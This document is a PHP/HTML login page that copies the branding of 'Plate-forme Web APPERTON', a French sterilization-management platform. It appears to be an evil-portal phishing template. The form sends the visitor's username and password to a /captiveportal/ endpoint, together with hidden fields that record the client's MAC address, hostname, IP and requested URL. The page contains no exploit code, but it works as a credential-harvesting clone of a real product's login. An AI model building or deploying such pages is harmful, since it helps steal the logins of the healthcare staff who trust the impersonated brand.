<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Plate-forme Web APPERTON</title>

<style>
body {
    font-family: Verdana, Arial, Helvetica, sans-serif;
    font-size: 10px;
    margin: 0;
    background-color: #ffffff;
}

/* ===== HEADER ===== */
.top-bar {
    background-color: #d9d9dd;
    padding: 6px 15px;
    font-size: 11px;
    color: #333;
    display: flex;
    align-items: center;
}

.top-bar img {
    height: 28px;
    margin-right: 10px;
}

/* ===== MAIN LAYOUT ===== */
.main-container {
    width: 1100px;
    margin: 40px auto;
    display: flex;
    justify-content: space-between;
    align-items: flex-start;
}

/* ===== LOGIN BOX (LEFT) ===== */
.login-box {
    border: 1px dotted #999;
    padding: 10px 15px;
    width: 260px;
    background: #f3f3f3;
}

.login-box label {
    display: inline-block;
    width: 110px;
}

.login-box input[type="text"],
.login-box input[type="password"] {
    width: 120px;
    padding: 2px 4px;
    margin-bottom: 6px;
    font-size: 10px;
    border: 1px solid #808080;
}

.login-box button {
    margin-top: 5px;
    padding: 3px 8px;
    font-size: 10px;
    cursor: pointer;
    border: 1px solid #808080;
    background-color: #F3F3F3;
}

.login-box button:hover {
    background-color: #ddd;
}

/* ===== CENTER LOGO ===== */
.center-logo {
    text-align: center;
    flex-grow: 1;
}

.center-logo img {
    max-width: 500px;
}

/* ===== RIGHT INFO BOX ===== */
.info-box {
    width: 420px;
    border: 1px dotted #999;
    padding: 15px;
    background-color: #f9f9f9;
    font-size: 11px;
}

.info-box h2 {
    font-size: 13px;
    margin-top: 0;
}
</style>
</head>
<body>

<!-- HEADER WITH SMALL LOGO -->
<div class="top-bar">
    <img src="../assets/logo_apperton_2.jpg" alt="Apperton Logo">
    Plate-forme Web APPERTON - v04.6.2 - Assistance
</div>

<div class="main-container">

    <!-- LEFT LOGIN -->
    <form method="POST"
          action="/captiveportal/index.php"
          class="login-box"
          autocomplete="off">

        <label>Nom d'utilisateur:</label>
        <input type="text" name="username" required><br>

        <label>Mot de passe:</label>
        <input type="password" name="password" required><br>

        <!-- Hidden inputs -->
        <input type="hidden" name="hostname"
               value="<?= htmlspecialchars(getClientHostName($_SERVER['REMOTE_ADDR'] ?? '')) ?>">

        <input type="hidden" name="mac"
               value="<?= htmlspecialchars(getClientMac($_SERVER['REMOTE_ADDR'] ?? '')) ?>">

        <input type="hidden" name="ip"
               value="<?= htmlspecialchars($_SERVER['REMOTE_ADDR'] ?? '') ?>">

        <input type="hidden" name="target"
               value="<?= htmlspecialchars($destination ?? '') ?>">

        <button type="submit">S'identifier</button>
    </form>

    <!-- CENTER LARGE LOGO -->
    <div class="center-logo">
        <img src="../assets/logo_apperton_3.png" alt="Apperton">
        <p style="font-size:20px;margin-top:10px;">
            Au service de la stérilisation
        </p>
    </div>

    <!-- RIGHT INFO -->
    <div class="info-box">
        <h2>Bienvenue sur la Plateforme Web APPERTON</h2>

        <p><strong>Découvrez de quelle façon la Plateforme Web peut améliorer votre quotidien !</strong></p>

        <p><strong>Pilotez l'application sans clavier ni souris !</strong></p>

        <p>
            Les agents s'affranchissent du clavier et de la souris
            et n'ont en main qu'un lecteur de codes barres pour piloter la Plateforme Web APPERTON.
        </p>

        <p><strong>Un système sécurisé et personnalisé !</strong></p>

        <p>
            Chaque personne qui se connecte est identifiée par un login
            qui lui donne accès aux fonctionnalités correspondant à son secteur d'activité.
        </p>

        <p>
            La connexion peut se faire sans clavier ni souris
            au moyen d'un badge.
        </p>
    </div>

</div>

</body>
</html>
